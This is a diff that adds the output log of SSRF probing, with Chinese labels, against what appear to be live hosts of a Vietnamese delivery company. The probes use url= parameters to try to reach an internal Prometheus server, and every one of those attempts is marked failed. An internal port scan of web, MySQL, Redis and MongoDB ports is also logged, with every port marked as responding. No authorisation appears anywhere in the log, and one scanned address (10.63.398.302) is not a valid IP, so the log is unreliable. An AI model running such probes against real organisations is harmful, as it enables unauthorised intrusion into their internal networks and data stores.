@@ -1,0 +1,68 @@
+[*] 测试SSRF访问Prometheus监控系统...
+
+━━━ 测试: admin.giaohangtietkiem.vn ━━━
+  [1] /api/fetch?url=http://10.110.28.141:9090/metrics → ❌
+  [2] /api/fetch?url=http://10.110.28.141:9090/api/v1/targets → ❌
+  [3] /api/fetch?url=http://10.110.28.141:9090/config → ❌
+
+━━━ 测试: admin.giaohangtietkiem.vn ━━━
+  [1] /api/proxy?url=http://10.110.28.141:9090/metrics → ❌
+  [2] /api/proxy?url=http://10.110.28.141:9090/api/v1/targets → ❌
+  [3] /api/proxy?url=http://10.110.28.141:9090/config → ❌
+
+━━━ 测试: admin.giaohangtietkiem.vn ━━━
+  [1] /api/image?url=http://10.110.28.141:9090/metrics → ❌
+  [2] /api/image?url=http://10.110.28.141:9090/api/v1/targets → ❌
+  [3] /api/image?url=http://10.110.28.141:9090/config → ❌
+
+━━━ 测试: dashboard.ghtk.vn ━━━
+  [1] /api/fetch?url=http://10.110.28.141:9090/metrics → ❌
+  [2] /api/fetch?url=http://10.110.28.141:9090/api/v1/targets → ❌
+  [3] /api/fetch?url=http://10.110.28.141:9090/config → ❌
+
+━━━ 测试: dashboard.ghtk.vn ━━━
+  [1] /api/image?url=http://10.110.28.141:9090/metrics → ❌
+  [2] /api/image?url=http://10.110.28.141:9090/api/v1/targets → ❌
+  [3] /api/image?url=http://10.110.28.141:9090/config → ❌
+
+━━━ 测试: dashboard.ghtk.vn ━━━
+  [1] /api/screenshot?url=http://10.110.28.141:9090/metrics → ❌
+  [2] /api/screenshot?url=http://10.110.28.141:9090/api/v1/targets → ❌
+  [3] /api/screenshot?url=http://10.110.28.141:9090/config → ❌
+
+━━━ 测试: inter.ghtk.vn ━━━
+  [1] /api/proxy?url=http://10.110.28.141:9090/metrics → ❌
+  [2] /api/proxy?url=http://10.110.28.141:9090/api/v1/targets → ❌
+  [3] /api/proxy?url=http://10.110.28.141:9090/config → ❌
+
+━━━ 测试: inter.ghtk.vn ━━━
+  [1] /api/callback?url=http://10.110.28.141:9090/metrics → ❌
+  [2] /api/callback?url=http://10.110.28.141:9090/api/v1/targets → ❌
+  [3] /api/callback?url=http://10.110.28.141:9090/config → ❌
+
+━━━ 测试: hrm-api.ghtk.vn ━━━
+  [1] /api/webhook?url=http://10.110.28.141:9090/metrics → ❌
+  [2] /api/webhook?url=http://10.110.28.141:9090/api/v1/targets → ❌
+  [3] /api/webhook?url=http://10.110.28.141:9090/config → ❌
+
+━━━ 测试: sos.ghtk.vn ━━━
+  [1] /api/fetch?url=http://10.110.28.141:9090/metrics → ❌
+  [2] /api/fetch?url=http://10.110.28.141:9090/api/v1/targets → ❌
+  [3] /api/fetch?url=http://10.110.28.141:9090/config → ❌
+
+
+[*] 测试其他内网IP...
+━━━ 内网IP: 10.63.2.15 ━━━
+  Port 80 → ⚠️  有响应！
+  Port 443 → ⚠️  有响应！
+  Port 8080 → ⚠️  有响应！
+  Port 3306 → ⚠️  有响应！
+  Port 6379 → ⚠️  有响应！
+  Port 27017 → ⚠️  有响应！
+━━━ 内网IP: 10.63.398.302 ━━━
+  Port 80 → ⚠️  有响应！
+  Port 443 → ⚠️  有响应！
+  Port 8080 → ⚠️  有响应！
+  Port 3306 → ⚠️  有响应！
+  Port 6379 → ⚠️  有响应！
+  Port 27017 → ⚠️  有响应！
